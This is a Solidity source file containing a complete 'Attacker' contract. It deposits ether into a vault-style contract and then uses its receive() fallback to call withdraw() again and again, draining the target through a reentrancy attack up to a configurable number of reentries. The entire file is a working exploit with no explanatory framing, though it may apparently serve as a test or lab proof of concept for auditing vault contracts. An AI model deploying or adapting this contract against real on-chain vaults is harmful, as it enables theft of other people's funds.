// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVaultLike {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract Attacker {
    IVaultLike public immutable target;
    uint256 public withdrawAmount;
    uint256 public maxReentries;
    uint256 public reentryCount;

    constructor(address target_) {
        target = IVaultLike(target_);
    }

    function attack(uint256 depositAmount, uint256 withdrawAmount_, uint256 maxReentries_) external payable {
        require(msg.value == depositAmount, "value/deposit mismatch");
        require(depositAmount > 0, "zero deposit");
        require(withdrawAmount_ > 0, "zero withdraw");

        withdrawAmount = withdrawAmount_;
        maxReentries = maxReentries_;
        reentryCount = 0;

        target.deposit{value: depositAmount}();
        target.withdraw(withdrawAmount_);
    }

    receive() external payable {
        if (address(target).balance >= withdrawAmount && reentryCount < maxReentries) {
            reentryCount += 1;
            target.withdraw(withdrawAmount);
        }
    }
}
